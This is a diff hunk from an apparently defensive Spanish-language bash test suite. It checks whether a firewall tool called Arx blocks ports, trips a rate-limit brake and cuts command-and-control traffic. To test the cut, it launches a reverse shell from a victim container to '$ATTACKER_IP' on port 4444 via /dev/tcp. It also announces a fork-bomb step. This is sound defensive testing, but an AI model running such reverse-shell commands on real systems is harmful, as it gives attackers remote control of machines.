@@ -30,7 +30,7 @@ if wait_for 70 tripped; then pass "el freno salta y Arx deja de actuar"; else fa
 BLOCKED=$(v nft list set inet arx block_tcp | grep -oE '700[0-9]' | sort -u | wc -l)
 if [ "$BLOCKED" -le 5 ]; then pass "se detuvo en el límite ($BLOCKED puertos de 8)"; else fail "se detuvo en el límite ($BLOCKED puertos de 8)"; fi
 docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
-c2_cut() { docker exec "$VIC" nft list set inet arx c2_out4 2>/dev/null | grep -q "$ATTACKER_IP"; }
+c2_cut() { local out; out=$(docker exec "$VIC" nft list set inet arx c2_out4 2>/dev/null); grep -q "$ATTACKER_IP" <<<"$out"; }
 if wait_for 70 c2_cut; then pass "agotado el freno, el reverse shell sí se corta (cupo para críticos)"; else fail "agotado el freno, el reverse shell sí se corta"; fi
 
 step "fork bomb acotada por systemd (25 s, máximo 1024 tareas)"
